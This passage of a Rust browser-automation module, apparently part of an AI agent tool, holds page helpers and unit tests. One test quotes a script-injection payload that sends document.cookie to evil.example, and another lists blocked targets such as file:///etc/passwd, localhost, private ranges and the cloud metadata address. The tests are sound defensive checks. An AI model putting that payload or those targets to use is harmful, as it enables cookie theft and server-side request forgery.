    Ok(path)
}

/// Refresh `title`/`domain` off the live page after a navigation-shaped
/// action, so the Browser panel and future error messages stay current.
async fn settle(session: &mut BrowserSession) {
    session.title = session.page.get_title().await.ok().flatten().unwrap_or_default();
    session.domain = session
        .page
        .url()
        .await
        .ok()
        .flatten()
        .and_then(|u| host_of(&u))
        .unwrap_or_default();
}

async fn visible_text(page: &Page) -> Result<String, String> {
    page.evaluate("document.body ? document.body.innerText : ''")
        .await
        .map_err(|e| e.to_string())?
        .into_value::<String>()
        .map_err(|e| e.to_string())
}

fn clamp(s: &str, cap: usize) -> String {
    if s.chars().count() <= cap {
        return s.to_string();
    }
    let mut out: String = s.chars().take(cap).collect();
    out.push('\u{2026}');
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    /// The click matcher interpolates the model's text into a script that runs
    /// in the page. JSON string escaping is the only thing standing between
    /// that text and arbitrary script execution, so it gets its own test.
    #[test]
    fn click_text_cannot_break_out_of_its_javascript_string() {
        let hostile = "\"; fetch('https://evil.example?c='+document.cookie); //";
        let needle = serde_json::to_string(hostile).unwrap();
        let js = CLICK_BY_TEXT_JS.replace("__NEEDLE__", &needle);

        // The payload survives only as escaped data inside one string literal.
        assert!(js.contains("\\\"; fetch("), "the quote must be escaped, not closing the literal");
        assert!(!js.contains("__NEEDLE__"), "the placeholder is actually substituted");
        // Round-tripping the literal yields the original text, unexecuted.
        let back: String = serde_json::from_str(&needle).unwrap();
        assert_eq!(back, hostile);
    }

    /// A newline would end the statement in a naive interpolation.
    #[test]
    fn click_text_with_newlines_stays_one_literal() {
        let needle = serde_json::to_string("first\nsecond").unwrap();
        assert_eq!(needle, "\"first\\nsecond\"");
        assert!(!needle.contains('\n'));
    }

    #[test]
    fn refuses_non_web_and_local_addresses() {
        assert!(refused_host("file:///etc/passwd").is_some());
        assert!(refused_host("about:blank").is_some());
        assert!(refused_host("javascript:alert(1)").is_some());
        assert!(refused_host("http://localhost:8080/").is_some());
        assert!(refused_host("http://127.0.0.1/").is_some());
        assert!(refused_host("http://192.168.1.1/").is_some());
        assert!(refused_host("http://10.0.0.5/").is_some());
        assert!(refused_host("http://[::1]/").is_some());
        // An IPv6 literal is bracketed by `host_str`, and these three shapes
        // all reach this machine or its LAN by a route the v4 rules alone
        // would miss.
        assert!(refused_host("http://[::]/").is_some());
        assert!(refused_host("http://[::ffff:127.0.0.1]/").is_some());
        assert!(refused_host("http://[fe80::1]/").is_some());
        assert!(refused_host("http://[fd00::1]/").is_some());
        assert!(refused_host("http://0.0.0.0:9000/").is_some());
        assert!(refused_host("http://169.254.169.254/latest/meta-data/").is_some());
        assert!(refused_host("http://example.com/").is_none());
        assert!(refused_host("https://[2606:4700:4700::1111]/").is_none());
        assert!(refused_host("https://en.wikipedia.org/wiki/Rust").is_none());
    }

    #[test]
    fn host_of_lowercases_and_ignores_path() {
        assert_eq!(host_of("https://Example.com/Path?q=1"), Some("example.com".to_string()));
        assert_eq!(host_of("not a url"), None);
    }

    #[test]
    fn xpath_literal_handles_both_quote_styles() {
        assert_eq!(xpath_literal("Sign in"), "'Sign in'");
        assert_eq!(xpath_literal("It's here"), "\"It's here\"");
        // Text containing both quote characters needs concat(), since XPath
        // 1.0 has no escape character for a literal.
        let mixed = xpath_literal("It's a \"test\"");
        assert!(mixed.starts_with("concat("));
        assert!(mixed.contains("It"));
    }

    #[test]
    fn clamp_counts_chars_not_bytes() {
        assert_eq!(clamp("hello", 10), "hello");
        assert_eq!(clamp("hello world", 5), "hello\u{2026}");
    }
}
